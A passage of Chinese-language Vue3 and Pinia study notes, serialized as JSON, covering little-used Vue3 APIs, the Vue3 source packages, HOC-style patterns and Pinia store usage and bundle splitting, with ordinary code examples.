<div>1</div>\n  <div>2</div>\n</>\n```\n\n### 6.5. 性能考虑\n\n- React 的JSX 每次更新都会重新执行整个组件函数\n- Vue3的 JSX 借助响应式系统，可以实现更细粒度的更新\n- Vue3 在编译时可以进行更多优化，因为它的模板语法提供了更多静态分析的机会\n\n### 6.6. 使用场景\n\n- React中 JSX 是主要的模板编写方式\n- Vue中 JSX 更多是一个补充选项，通常在需要更灵活的渲染逻辑时使用\n\n### 6.7. 开发体验\n\n- React的JSX更接近原生JavaScript的编程体验\n- Vue的JSX需要考虑响应式特性，有时需要额外处理.value\n- Vue提供了两种选择：模板语法和JSX，可以根据需求选择\n\n### 6.8. 调试与工具支持\n\n- React的JSX调试工具更成熟（React DevTools）\n- Vue的JSX调试体验相对较差，尤其是与模板语法相比\n\n","NSrRMDo3":"\n# Vue3 中不常用的 API\n\n`#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- v-pre：\n\t- **跳过该元素及其所有子元素的编译**\n- v-memo：\n\t- 用于缓存\n- v-once：\n\t- 仅渲染元素和组件一次，并跳过之后的更新\n- v-cloak：\n\t- 用于隐藏尚未完成编译的 DOM 模板\n\n## 2. 全局 API \n\n![图片&文件](./files/20241105-16.png)\n\n## 3. 组合式 API\n\n- onErrorCaptured\n\n![图片&文件](./files/20241105-17.png)\n\n- `useSlots` 和 `useAttrs` 是真实的运行时函数\n\t- 它的返回与 `setupContext.slots` 和 `setupContext.attrs` 等价\n- `useTemplateRef`：\n\t- 返回一个浅层 ref，其值将与模板中的具有匹配 ref attribute 的元素或组件同步\n\n## 4. 内置内容\n\n![图片&文件](./files/20241105-18.png)\n- v-pre：\n\t- **跳过该元素及其所有子元素的编译**\n- v-memo：\n\t- 用于缓存\n- v-once：\n\t- 仅渲染元素和组件一次，并跳过之后的更新\n- v-cloak：用于隐藏尚未完成编译的 DOM 模板\n\t- ![图片&文件](./files/20241105-19.png)\n- TransitionGroup：\n\t- 为列表中的**多个**元素或组件提供过渡效果\n\n\n更多参考：\n- [29. v-memo 介绍](/post/vtfiPOVb.html)\n\n## 5. 单文件组件\n\n![图片&文件](./files/20241105-20.png)\n\n## 6. 进阶 API\n\n![992](#)","vuJqbKaZ":"\n# Vue3 源码主要包功能介绍分析\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- compiler-core：\n\t- 模板 → 渲染函数\n- compiler-dom\n\t- ==浏览器中进行运行时编译==\n- compiler-sfc\n\t- 编译 `.vue` 文件\n- reactivity\n\t- 提供 `reactive、ref、computed` 等核心 API\n- runtime-core\n\t- 运行时核心逻辑，包括渲染器、 diff、组件系统设计\n- runtime-dom\n\t- 基于 runtime-core，添加了浏览器 DOM 特定的运行时代码。\n- server-renderer\n\t- 实现 Vue 的服务器端渲染（SSR）功能\n- shared\n\t- 公共\n- vue\n\t- 作为 Vue 3 的主入口\n\t- 整合了运行时和编译器\n\n## 2. compiler-core\n\n作用：\n- 实现与平台无关的编译器核心功能。\n- 负责将模板解析为抽象语法树（AST），然后转换和优化 AST，最后生成**渲染函数**。\n使用场景：\n- 作为其他编译器包的基础，如 compiler-dom 和 compiler-ssr。\n- 当需要为非浏览器环境创建自定义编译器时。\n注意事项：\n- 这个包是平台无关的，不包含任何与 DOM 或 浏览器相关的代码。\n- 通常不会直接使用，而是通过 `compiler-dom` 或自定义编译器间接使用。\n\n## 3. compiler-dom\n\n作用：\n- 基于 compiler-core，添加了**缓存全部或部分虚拟节点**。\n- 处理 DOM 特定的指令和属性。\n使用场景：\n- 在构建过程中编译 Vue 模板。\n- 在浏览器中进行运行时编译（虽然不推荐在生产环境中使用）。\n注意事项：\n- 通常与构建工具集成使用，而不是直接在应用代码中使用。\n- 确保版本与其他 Vue 包匹配，以避免兼容性问题。\n\n**可以单独使用**：是，但不常见\n- 创建自定义编译器\n- 在运行时编译模板（不推荐在生产环境中使用）\n```javascript\nimport { compile } from '@vue/compiler-dom'\n\nconst template = '<div>Hello, {{ name }}</div>'\nconst { code } = compile(template)\nconsole.log(code) // 输出编译后的渲染函数\n\n```\n\n>  之前用过，在 markdown 中嵌入 Vue 组件时可以考虑使用\n\n## 4. compiler-sfc\n\n作用：\n- 编译 Vue 单文件组件（.vue 文件）。\n- 处理 `<template>、<script> 和 <style> 块`。\n使用场景：\n- 在 Vue CLI 或 Vite 等构建工具中使用，用于处理 `.vue` 文件。\n注意事项：\n- 这个包通常由构建工具内部使用，开发者很少需要直接与之交互。\n- 支持 TypeScript、CSS 预处理器等功能，需要相应的插件支持。\n\n## 5. reactivity\n\n作用：\n- 实现 Vue 3 的响应式系统。\n- 提供 `reactive、ref、computed` 等核心 API\n使用场景：\n- 在 Vue 应用中创建响应式数据。\n- 可以独立于 Vue 使用，用于任何需要响应式数据的 JavaScript 应用。\n注意事项：\n- 理解 Vue 3 的响应式原理对于高效使用至关重要\n- 注意避免循环依赖，可能导致性能问题\n\n可单独使用 \n\n```javascript\nimport { reactive, effect } from '@vue/reactivity'\n\nconst state = reactive({ count: 0 })\n\neffect(() => {\n  console.log('Count is:', state.count)\n})\n\n// 将触发效果\nstate.count++\n\n```\n\n## 6. runtime-core\n\n作用：\n- 实现 Vue 的核心运行时功能。\n- 包含**组件系统、虚拟 DOM、渲染器等核心概念**的实现。\n使用场景：\n- 作为 Vue 运行时的基础，通常不直接使用。\n- 当需要为特定平台创建自定义渲染器时可能会用到。\n注意事项：\n- 这是一个平台无关的包，不包含任何 DOM 操作。\n- 深入理解这个包有助于理解 Vue 的内部工作原理。\n\n## 7. runtime-dom\n\n作用：\n- 基于 runtime-core，添加了浏览器 DOM 特定的运行时代码。\n- 处理 DOM 事件、属性、样式等。\n使用场景：\n- 在浏览器环境中运行 Vue 应用。\n注意事项：\n- 这是大多数 Vue 应用实际使用的运行时包。\n- 确保与其他 Vue 包的版本一致。\n\n## 8. server-renderer\n\n作用：\n- 实现 Vue 的服务器端渲染（SSR）功能。\n使用场景：\n- 需要服务器端渲染的 Vue 应用。\n- 用于改善首屏加载性能和 SEO。\n注意事项：\n- 使用 SSR 需要特别注意服务器端和客户端状态的同步。\n- 某些浏览器特定的 API 在服务器端不可用，需要适当处理。\n\n## 9. shared\n\n作用：\n- 提供在其他 Vue 包中**共享的工具函数和常量**。\n使用场景：\n- 在 Vue 的其他包中使用。\n- 可以在自定义 Vue 插件或工具中使用这些共享函数。\n注意事项：\n- 这个包的内容可能会随 Vue 版本更新而变化。\n- 不建议在应用代码中直接依赖这个包，因为它主要用于 Vue 内部。\n\n## 10. vue\n\n作用：\n- 作为 Vue 3 的主入口。\n- 整合了运行时和编译器。\n使用场景：\n- 在浏览器中使用完整版的 Vue（包括运行时编译器）。\n- 通过 CDN 使用 Vue 时。\n注意事项：\n- 在生产环境中，推荐使用仅运行时版本以减小包体积。\n- 使用构建工具时，通常会自动选择合适的版本。\n","m4rXzI0I":"\n# vue3 中实现类似于 React 高阶组件的功能？\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 使用 `h 函数` 再包装一下可以实现 HOC\n- 组合式函数\n- 混入 app.mixin 等\n- 自定义指令\n- provide & inject \n\n## 2. 组合式函数（Composables）\n\n这是Vue 3中最接近React高阶组件概念的方法。组合式函数允许我们封装和重用有状态逻辑。\n\n示例：`useLogger`\n\n```typescript\n// useLogger.ts\nimport { ref, onMounted, onUnmounted } from 'vue'\n\nexport function useLogger(componentName: string) {\n  const mountedTime = ref<number>(0)\n\n  onMounted(() => {\n    console.log(`${componentName} mounted`)\n    mountedTime.value = Date.now()\n  })\n\n  onUnmounted(() => {\n    console.log(`${componentName} unmounted after ${Date.now() - mountedTime.value}ms`)\n  })\n}\n\n// 使用方式\n// MyComponent.vue\nimport { defineComponent } from 'vue'\nimport { useLogger } from './useLogger'\n\nexport default defineComponent({\n  name: 'MyComponent',\n  setup() {\n    useLogger('MyComponent')\n    // 组件的其他逻辑...\n  }\n})\n```\n\n## 3. 渲染函数 和 JSX：withLogger\n\nVue 3支持使用渲染函数和JSX，这让我们可以更接近 React的编程方式，包括实现类似HOC的模式。\n\n示例：\n\n```typescript hl:15\n// withLogger.tsx\nimport { defineComponent, h, onMounted, onUnmounted } from 'vue'\n\nexport function withLogger(WrappedComponent: any) {\n  return defineComponent({\n    setup(props, { attrs, slots }) {\n      onMounted(() => {\n        console.log(`${WrappedComponent.name} mounted`)\n      })\n\n      onUnmounted(() => {\n        console.log(`${WrappedComponent.name} unmounted`)\n      })\n\n      return () => h(WrappedComponent, { ...props, ...attrs }, slots)\n    }\n  })\n}\n\n// 使用方式\n// MyComponent.tsx\nimport { defineComponent } from 'vue'\nimport { withLogger } from './withLogger'\n\nconst MyComponent = defineComponent({\n  name: 'MyComponent',\n  setup() {\n    return () => <div>Hello from MyComponent</div>\n  }\n})\n\nexport default withLogger(MyComponent)\n```\n\n## 4. 插件和全局混入（Mixin）\n\n虽然不如组合式函数灵活，但对于某些场景，我们可以使用Vue插件或全局混入来添加跨组件的功能。\n\n示例：\n\n```typescript\n// logger-plugin.ts\nimport { Plugin } from 'vue'\n\nexport const LoggerPlugin: Plugin = {\n  install(app) {\n    app.mixin({\n      mounted() {\n        console.log(`${this.$options.name} mounted`)\n      },\n      unmounted() {\n        console.log(`${this.$options.name} unmounted`)\n      }\n    })\n  }\n}\n\n// main.ts\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport { LoggerPlugin } from './logger-plugin'\n\nconst app = createApp(App)\napp.use(LoggerPlugin)\napp.mount('#app')\n```\n\n## 5. 自定义指令\n\n对于一些特定的功能，我们可以使用Vue的自定义指令来实现类似HOC的效果。\n\n示例：\n\n```typescript\n// logger-directive.ts\nimport { Directive } from 'vue'\n\nexport const logger: Directive = {\n  mounted(el, binding) {\n    console.log(`${binding.value} mounted`)\n  },\n  unmounted(el, binding) {\n    console.log(`${binding.value} unmounted`)\n  }\n}\n\n// 使用方式\n// MyComponent.vue\n<template>\n  <div v-logger=\"'MyComponent'\">\n    <!-- 组件内容 -->\n  </div>\n</template>\n\n<script>\nimport { logger } from './logger-directive'\n\nexport default {\n  directives: {\n    logger\n  }\n}\n</script>\n```\n\n## 6. 提供/注入（Provide/Inject）\n\n对于需要在组件树中==共享数据或功能==的场景，我们可以使用 Vue 3的 `provide/inject` 特性。\n\n示例：\n\n```typescript\n// LoggerProvider.vue\n<script lang=\"ts\">\nimport { defineComponent, provide } from 'vue'\n\nexport const loggerKey = Symbol()\n\nexport default defineComponent({\n  setup() {\n    const logger = {\n      log: (componentName: string, message: string) => {\n        console.log(`[${componentName}] ${message}`)\n      }\n    }\n\n    provide(loggerKey, logger)\n\n    return () => null\n  }\n})\n</script>\n\n// 使用方式\n// MyComponent.vue\n<script lang=\"ts\">\nimport { defineComponent, inject, onMounted } from 'vue'\nimport { loggerKey } from './LoggerProvider.vue'\n\nexport default defineComponent({\n  setup() {\n    const logger = inject(loggerKey)\n\n    onMounted(() => {\n      logger?.log('MyComponent', 'Component mounted')\n    })\n\n    // 组件的其他逻辑...\n  }\n})\n</script>\n```\n\n","Vib6fmfD":"\n# Pinia 状态管理库文档笔记\n\n\n`#pinia` `#vue` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 每个命名空间下，都应该提供`清空方法` ，避免内存暴增\n\t- `store.$reset()`\n- 某些场景可以考虑使用 WeakMap/WeakSet\n- 注意 vite 拆包 pinia\n- ==大型应用或数据密集型应用==可以考虑搞个 pinia 插件来管理内存\n\t- 监控内存大小\n\t\t- `new Blob([JSON.stringify(state)]).size\n\t- 过期策略：多久没有访问了？\n\t- 最近访问的多少条数据\n\t- **路由切换时清理** ? \n\n---\n\n\n\n>  文档地址： https://pinia.vuejs.org/zh/core-concepts/getters.html\n\n## 1. 为什么？\n\n- Pinia 抛弃了 `Mutation`，这意味着你可以直接更新状态，**不用再注册 Commit**\n- 语法上更加贴近 Composition Api\n- 数据持久化使用： `pinia-plugin-persistedstate`\n- 允许构建工具自动进行**代码分割**以及 **TypeScript 推断**\n\n## 2. 两种定义方式\n\n>  约定：所有的 store 定义，都使用 **use 开头**\n\n### 2.1. 方式一：Option Store\n\n Store 是用 `defineStore()` 定义的，它的第一个参数要求是一个独一无二的名字\n\n```javascript\n// 第一个参数是你的应用中 Store 的唯一 ID。\nexport const useCounterStore = defineStore('counter', {\n  // 为了完整类型推理，推荐使用箭头函数\n  state: () => ({ count: 0 }),\n  getters: {\n    double: (state) => state.count * 2,\n  },\n  actions: {\n    increment() {\n      this.count++\n    },\n  },\n})\n```\n\n`state` 是 store 的数据 (data)，`getters` 是 store 的计算属性 (computed)，而 `actions` 则是方法 (methods)\n\n### 2.2. 方式二：Setup Store\n\n```javascript\nexport const useCounterStore = defineStore('counter', () => {\n  const count = ref(0)\n  function increment() {\n    count.value++\n  }\n\n  return { count, increment }\n})\n```\n\n- `ref()` 就是 state 属性\n- `computed() `就是 getters\n- `function() `就是 actions\n\n### 2.3. 使用场景选择\n\n- Setup store 比 Option Store 带来了更多的**灵活性**，因为你可以在一个 store 内创建侦听器，并自由地使用任何组合式函数。\n- 不过，请记住，使用组合式函数会让 **SSR** 变得更加复杂\n\n## 3. 使用 TS 定义 state，并使用它\n\n```typescript\ninterface State {\n  userList: UserInfo[]\n  user: UserInfo | null\n}\n\nconst useStore = defineStore('storeId', {\n  state: (): State => {\n    return {\n      userList: [],\n      user: null,\n    }\n  },\n})\n\ninterface UserInfo {\n  name: string\n  age: number\n}\n```\n\n### 3.1. 使用 Store\n\n```typescript\nconst store = useStore()\n\nstore.count++\n\n\n// 重置，将 state 重置为初始值。\nstore.$reset()\n```\n\n### 3.2. 选项式的重置与管理\n\n直接调用内部返回的 `$reset()` 即可\n\n```typescript\nconst store = useStore()\n\nstore.$reset()\n```\n\n选项式中\n- 你可以使用 `mapState` 来辅助管理状态，将 state 属性映射为**只读的计算属性**\n- 可以使用 `mapWritableState()` 来修改 state 属性\n\n### 3.3. 组合式的重置\n\n需要自定义 `$reset()`\n\n```typescript\nexport const useCounterStore = defineStore('counter', () => {\n  const count = ref(0)\n\n  function $reset() {\n    count.value = 0\n  }\n\n  return { count, $reset }\n})\n```\n\n### 3.4. 变更 state ： 使用 `store.$patch` 在同一时间更改多个属性\n\n`store.$patch` ： 同一时间更改多个属性\n\n```typescript\n① 同一时间更改多个属性\nstore.$patch({\n  count: store.count + 1,\n  age: 120,\n  name: 'DIO',\n})\n\n② 函数来组合控制更复杂的变更操作\nstore.$patch((state) => {\n  state.items.push({ name: 'shoes', quantity: 1 })\n  state.hasChanged = true\n})\n```\n\n### 3.5. 替换 state\n\n```typescript\n// 这实际上并没有替换`$state`\nstore.$state = { count: 24 }\n// 在它内部调用 `$patch()`：\nstore.$patch({ count: 24 })\n```\n\n### 3.6. 监听或者订阅 state\n\n使用 `$subscribe`\n\n```typescript\ncartStore.$subscribe((mutation, state) => {\n  // import { MutationType } from 'pinia'\n  mutation.type // 'direct' | 'patch object' | 'patch function'\n  // 和 cartStore.$id 一样\n  mutation.storeId // 'cart'\n  // 只有 mutation.type === 'patch object'的情况下才可用\n  mutation.payload // 传递给 cartStore.$patch() 的补丁对象。\n  // 每当状态发生变化时，将整个 state 持久化到本地存储。\n  localStorage.setItem('cart', JSON.stringify(state))\n})\n```\n\n卸载后监听仍然保留\n\n```typescript\n<script setup>\nconst someStore = useSomeStore()\n// 此订阅器即便在组件卸载之后仍会被保留\nsomeStore.$subscribe(callback, { detached: true })\n</script>\n```\n\n当然，你可以使用 `watch` 来监听，即在 pinia 实例上使用 `watch()` 函数侦听整个 state\n\n```typescript\nwatch(\n  pinia.state,\n  (state) => {\n    // 每当状态发生变化时，将整个 state 持久化到本地存储。\n    localStorage.setItem('piniaState', JSON.stringify(state))\n  },\n  { deep: true }\n)\n```\n\n## 4. Action\n\n### 4.1. 基本使用\n\n- Action 相当于组件中的 `method`\n- action 可以是**异步**的，也可以是 **同步**\n\n```typescript\nimport { mande } from 'mande'\n\nconst api = mande('/api/users')\n\nexport const useUsers = defineStore('users', {\n  state: () => ({\n    userData: null,\n    // ...\n  }),\n\n  actions: {\n   \n   同步的\n   increment() {\n      this.count++\n    },\n    异步的\n    async registerUser(login, password) {\n      try {\n        this.userData = await api.post({ login, password })\n        showTooltip(`Welcome back ${this.userData.name}!`)\n      } catch (error) {\n        showTooltip(error)\n        // 让表单组件显示错误\n        return error\n      }\n    },\n  },\n})\n```\n\nAction 可以像函数或者通常意义上的方法一样被调用，如下：\n\n```html\n<script setup>\nconst store = useCounterStore()\n// 将 action 作为 store 的方法进行调用\nstore.randomizeCounter()\n</script>\n<template>\n  <!-- 即使在模板中也可以 -->\n  <button @click=\"store.randomizeCounter()\">Randomize</button>\n</template>\n```\n\n### 4.2. 访问其他 store 的 action\n\n直接引入调用就好了，这样的好处是，可以**全局管理所有的 store**\n\n```typescript\nimport { useAuthStore } from './auth-store'\n\nexport const useSettingsStore = defineStore('settings', {\n  state: () => ({\n    preferences: null,\n    // ...\n  }),\n  actions: {\n    async fetchUserPreferences() {\n      const auth = useAuthStore()\n      if (auth.isAuthenticated) {\n        this.preferences = await fetchPreferences()\n      } else {\n        throw new Error('User must be authenticated')\n      }\n    },\n  },\n})\n\n```\n\n### 4.3. Action 选项式 API 的用法\n\n先看看 组合式的用法，**更易用**\n\n```html\n<script>\nimport { useCounterStore } from '../stores/counter'\nexport default defineComponent({\n  setup() {\n    const counterStore = useCounterStore()\n    return { counterStore }\n  },\n  methods: {\n    incrementAndPrint() {\n      this.counterStore.increment()\n      console.log('New Count:', this.counterStore.count)\n    },\n  },\n})\n</script>\n```\n\n可使用 `mapActions()` 辅助函数将 action 属性**映射为你组件中的方法**\n\n```typescript\nimport { mapActions } from 'pinia'\nimport { useCounterStore } from '../stores/counter'\n\nexport default {\n  methods: {\n    // 访问组件内的 this.increment()\n    // 与从 store.increment() 调用相同\n    ...mapActions(useCounterStore, ['increment'])\n     \n    ① 与上述相同，但将其注册为this.myOwnName()\n    \n    ...mapActions(useCounterStore, { myOwnName: 'increment' }),\n  },\n}\n```\n\n### 4.4. 订阅或监听 Action\n\n即 监听 action 方法执行后的结果\n\n```typescript\nconst unsubscribe = someStore.$onAction(\n  ({\n    name, // action 名称\n    store, // store 实例，类似 `someStore`\n    args, // 传递给 action 的参数数组\n    after, // 在 action 返回或解决后的钩子\n    onError, // action 抛出或拒绝的钩子\n  }) => {\n    // 为这个特定的 action 调用提供一个共享变量\n    const startTime = Date.now()\n    // 这将在执行 \"store \"的 action 之前触发。\n    console.log(`Start \"${name}\" with params [${args.join(', ')}].`)\n\n    // 这将在 action 成功并完全运行后触发。\n    // 它等待着任何返回的 promise\n    after((result) => {\n      console.log(\n        `Finished \"${name}\" after ${\n          Date.now() - startTime\n        }ms.\\nResult: ${result}.`\n      )\n    })\n\n    // 如果 action 抛出或返回一个拒绝的 promise，这将触发\n    onError((error) => {\n      console.warn(\n        `Failed \"${name}\" after ${Date.now() - startTime}ms.\\nError: ${error}.`\n      )\n    })\n  }\n)\n\n// 手动删除监听器\nunsubscribe()\n```\n\n第二次参数：`someStore.$onAction(callback, true)`\n\n```typescript\n<script setup>\nconst someStore = useSomeStore()\n// 此订阅器即便在组件卸载之后仍会被保留\nsomeStore.$onAction(callback, true)\n</script>\n```\n\n## 5. Pinia 插件\n\n插件是通过`pinia.use() `添加到`pinia 实例`的 ，使用插件的场景有\n\n- 添加新的状态属性到 store\n- 定义 store时创建新的选项\n- 为 store 增加新的方法\n- 包装现有的方法\n- 改变或取消 action\n- 实现副作用，比如 本地存储\n- 扩展 store 的属性\n\n### 5.1. 最简单的一个示例\n\n通过返回一个对象**将一个静态属性添加到所有 store**，如：\n\n```typescript\nimport { createPinia } from 'pinia'\n\n// 创建的每个 store 中都会添加一个名为 `secret` 的属性。\n// 在安装此插件后，插件可以保存在不同的文件中\nfunction SecretPiniaPlugin() {\n  return { secret: 'the cake is a lie' }\n}\n\nconst pinia = createPinia()\n// 将该插件交给 Pinia\npinia.use(SecretPiniaPlugin)\n\n// 在另一个文件中\nconst store = useStore()\nstore.secret // 'the cake is a lie'\n```\n\n这对添加**全局对象**很有用，如**路由器、modal 或 toast 管理器**\n\n### 5.2. 如何定义插件\n\n```typescript\nexport function myPiniaPlugin(context) {\n  context.pinia // 用 `createPinia()` 创建的 pinia。 \n  context.app // 用 `createApp()` 创建的当前应用(仅 Vue 3)。\n  context.store // 该插件想扩展的 store\n  context.options // 定义传给 `defineStore()` 的 store 的可选对象。\n  // ...\n}\n```\n\n### 5.3. 每个 store 都添加上特定属性\n\n```typescript\n// 上文示例\npinia.use(({ store }) => {\n  store.hello = 'world'\n  // 确保你的构建工具能处理这个问题，webpack 和 vite 在默认情况下应该能处理。\n  if (process.env.NODE_ENV === 'development') {\n    // 添加你在 store 中设置的键值\n    store._customProperties.add('hello')\n  }\n})\n```\n\n>  每个 `store` 都被 `reactive` 包装过\n\n### 5.4. 添加新的外部属性\n\n```typescript\nimport { markRaw } from 'vue'\n// 根据你的路由器的位置来调整\nimport { router } from './router'\n\npinia.use(({ store }) => {\n  store.router = markRaw(router)\n})\n```\n\n> 使用 `markRaw` 标记一个对象，使其在响应式系统中变为非响应式的，避免无意义的渲染\n\n### 5.5. 在插件中调用 $subscribe\n\n你也可以在插件中使用 `store.$subscribe 和 store.$onAction `。\n\n```typescript hl:3,6\npinia.use(({ store }) => {\n  store.$subscribe(() => {\n    // 响应 store 变化\n  })\n  store.$onAction(() => {\n    // 响应 store actions\n  })\n})\n```\n\n### 5.6. 在定义 store 时，可添加新的 options\n\n比如，你可以创建一个 `debounce` 选项，允许你让**任何 action 实现防抖**。\n\n## 6. TS 支持\n\n具体再参考文档\n\n## 7. 组件外部使用 Store\n\n在组件外部使用store时，情况会有所不同\n\n在单页面应用程序中，只需在创建pinia实例之后调用`useStore()`函数即可正常工作。确保在pinia安装后才调用`useStore()`函数即可。\n\n例如，在Vue Router的导航守卫中使用 `store` 时\n- 应将 useStore() 的调用放在`beforeEach()`函数中\n\n## 8. Pinia 不太需要类似 immer.js 这样的库\n\n### 8.1. **Vue 的响应式系统本身已经很完善**\n\n```js\n// Pinia store 示例\nimport { defineStore } from 'pinia'\n\nexport const useUserStore = defineStore('user', {\n  state: () => ({\n    user: {\n      name: 'John',\n      profile: {\n        age: 25,\n        address: {\n          city: 'New York'\n        }\n      }\n    }\n  }),\n  \n  actions: {\n    // Vue 的响应式系统可以直接修改嵌套对象\n    updateCity(newCity) {\n      this.user.profile.address.city = newCity // 直接修改即可\n    }\n  }\n})\n```\n\n### 8.2. **Pinia 的状态更新是可变的**\n\n```js\n// Pinia 中直接修改状态\nconst store = useUserStore()\n\n// 直接修改\nstore.user.name = 'Jane'\n\n// 批量修改\nstore.$patch({\n  user: {\n    name: 'Jane',\n    profile: {\n      age: 26\n    }\n  }\n})\n\n// 使用函数式修改\nstore.$patch((state) => {\n  state.user.name = 'Jane'\n  state.user.profile.age += 1\n})\n```\n\n### 8.3. **对比 React + Redux 的情况**\n\n```js\n// React + Redux 需要 immer.js\nconst reducer = (state, action) => {\n  switch (action.type) {\n    case 'UPDATE_USER':\n      // 不使用 immer 时需要手动处理不可变更新\n      return {\n        ...state,\n        user: {\n          ...state.user,\n          profile: {\n            ...state.user.profile,\n            address: {\n              ...state.user.profile.address,\n              city: action.payload\n            }\n          }\n        }\n      }\n  }\n}\n\n// 使用 immer 后\nimport produce from 'immer'\n\nconst reducer = produce((draft, action) => {\n  switch (action.type) {\n    case 'UPDATE_USER':\n      draft.user.profile.address.city = action.payload\n      break\n  }\n})\n```\n\n### 8.4. **Pinia 的内置功能**\n\n```js\n// Pinia 提供了多种状态管理方式\nconst store = useUserStore()\n\n// 1. 直接修改\nstore.count++\n\n// 2. $patch 方法\nstore.$patch({\n  count: store.count + 1,\n  name: 'Jane'\n})\n\n// 3. 使用 actions\nstore.increment()\n\n// 4. 重置状态\nstore.$reset()\n\n// 5. 批量修改状态\nstore.$patch((state) => {\n  // 可以进行任意修改\n  state.items.push({ name: 'new item' })\n  state.count++\n})\n```\n\n### 8.5. **为什么 Pinia 不需要 immer.js**\n\n```js\n// Pinia store\nconst useStore = defineStore('main', {\n  state: () => ({\n    nested: {\n      data: {\n        count: 0\n      }\n    }\n  }),\n  \n  actions: {\n    // 1. 直接修改嵌套数据\n    updateCount() {\n      this.nested.data.count++ // Vue 响应式系统会自动处理\n    },\n    \n    // 2. 批量修改\n    batchUpdate() {\n      this.$patch((state) => {\n        state.nested.data.count++\n        state.nested.data.newField = 'value'\n      })\n    },\n    \n    // 3. 替换整个对象\n    replaceNested() {\n      this.nested = {\n        data: {\n          count: 100\n        }\n      }\n    }\n  }\n})\n```\n\n### 8.6. **性能考虑**\n\n```js\n// Pinia 已经优化了性能\nconst store = useStore()\n\n// 1. 组件中使用 storeToRefs 来保持响应性\nimport { storeToRefs } from 'pinia'\nconst { nested } = storeToRefs(store)\n\n// 2. 计算属性自动追踪依赖\nconst doubleCount = computed(() => store.nested.data.count * 2)\n\n// 3. 监听状态变化\nwatch(\n  () => store.nested.data.count,\n  (newValue) => {\n    console.log('Count changed:', newValue)\n  }\n)\n```\n\n### 8.7. 总结\n\n- **不必要性**：\n\t- Vue 的响应式系统已经很好地处理了状态更新\n\t- Pinia 支持直接修改状态\n\t- 提供了多种状态管理方式\n- **性能影响**：\n\t- 添加 immer.js 会增加包体积\n\t- 可能会引入额外的性能开销\n\t- Vue 的响应式系统已经很高效\n- **开发体验**：\n\t- Pinia 的 API 设计已经很友好\n\t- 不需要考虑不可变更新\n\t- 代码更简洁直观\n- **特殊情况**：\n\t- 如果你的项目同时使用 React 和 Vue，并且已经使用了 immer.js\n\t- 如果你需要特别复杂的状态更新逻辑\n\t- 这些情况下可以考虑使用 immer.js，但大多数情况下是不必要的\n\n因此，在一般的 Vue + Pinia 项目中，没有必要使用 immer.js，**Vue 的响应式系统和 Pinia 的 API 已经足够优秀和便捷**。\n\n## 9. Vue3 项目中对 Pinia 进行拆包处理：\n\n### 9.1. 基本拆包方案\n\n#### 9.1.1. **使用 Vite 的动态导入**\n\n```javascript\n// store/modules/user.js\nexport const useUserStore = defineStore('user', {\n  // store 配置\n})\n\n// store/modules/product.js\nexport const useProductStore = defineStore('product', {\n  // store 配置\n})\n\n// store/index.js\n// 动态导入各个 store 模块\nexport const stores = {\n  user: () => import('./modules/user'),\n  product: () => import('./modules/product')\n}\n```\n\n#### 9.1.2. **配置 Vite 的分包策略**\n\n```javascript\n// vite.config.js\nexport default defineConfig({\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          'store-user': ['./src/store/modules/user.js'],\n          'store-product': ['./src/store/modules/product.js'],\n          'vendor-pinia': ['pinia']\n        }\n      }\n    }\n  }\n})\n```\n\n### 9.2. 按功能模块拆分\n\n#### 9.2.1. **模块化组织 Store**\n\n```javascript\n// stores/modules/auth/index.js\nexport const useAuthStore = defineStore('auth', {\n  state: () => ({\n    user: null,\n    token: null\n  }),\n  // ...其他配置\n})\n\n// stores/modules/cart/index.js\nexport const useCartStore = defineStore('cart', {\n  state: () => ({\n    items: []\n  }),\n  // ...其他配置\n})\n```\n\n#### 9.2.2. **异步注册 Store**\n\n```javascript\n// 按需加载 store\nconst loadAuthStore = async () => {\n  const module = await import('./modules/auth')\n  return module.useAuthStore\n}\n\nconst loadCartStore = async () => {\n  const module = await import('./modules/cart')\n  return module.useCartStore\n}\n```\n\n### 9.3. 路由级别的拆分\n\n#### 9.3.1. **配合路由进行拆分**\n\n```javascript hl:7\n// router/index.js\nconst routes = [\n  {\n    path: '/user',\n    component: () => import('../views/User.vue'),\n    // 异步加载相关 store\n    beforeEnter: async (to, from, next) => {\n      await import('../stores/modules/user')\n      next()\n    }\n  }\n]\n```\n\n#### 9.3.2. **组件内按需导入**\n\n```vue hl:2\n<script setup>\n// 组件内动态导入 store\nconst initStore = async () => {\n  const { useUserStore } = await import('../stores/modules/user')\n  const userStore = useUserStore()\n  // 使用 store\n}\n\nonMounted(() => {\n  initStore()\n})\n</script>\n```\n\n### 9.4. 高级拆包配置\n\n#### 9.4.1. **使用 Rollup 的高级配置**\n\n```javascript\n// vite.config.js\nexport default defineConfig({\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks(id) {\n          // 将 node_modules 中的包单独打包\n          if (id.includes('node_modules')) {\n            if (id.includes('pinia')) {\n              return 'vendor-pinia'\n            }\n            return 'vendor'\n          }\n          // 将 store 模块单独打包\n          if (id.includes('/stores/modules/')) {\n            const module = id.split('/stores/modules/')[1].split('/')[0]\n            return `store-${module}`\n          }\n        }\n      }\n    }\n  }\n})\n```\n\n#### 9.4.2. **优化分包大小**\n\n```javascript\n// vite.config.js\nexport default defineConfig({\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          // 核心依赖单独打包\n          'vendor-core': ['vue', 'pinia'],\n          // 工具类库单独打包\n          'vendor-utils': ['lodash', 'axios'],\n          // store 按模块打包\n          'store-user': ['./src/stores/modules/user'],\n          'store-cart': ['./src/stores/modules/cart']\n        }\n      }\n    },\n    // 设置chunk大小警告阈值\n    chunkSizeWarningLimit: 1000\n  }\n})\n```\n\n### 9.5. 最佳实践建议\n\n#### 9.5.1. **合理的模块划分**\n\n```javascript\n// 按业务域划分\nstores/\n  ├── modules/\n  │   ├── user/          // 用户相关\n  │   │   ├── index.js\n  │   │   └── types.ts\n  │   ├── product/       // 产品相关\n  │   └── cart/          // 购物车相关\n  └── index.js\n```\n\n#### 9.5.2. **懒加载策略**\n\n```javascript\n// 在需要时才加载对应的 store\nconst useStore = async () => {\n  const module = await import(`./modules/${moduleName}`)\n  return module.default\n}\n```\n\n#### 9.5.3. **性能优化**\n\n- 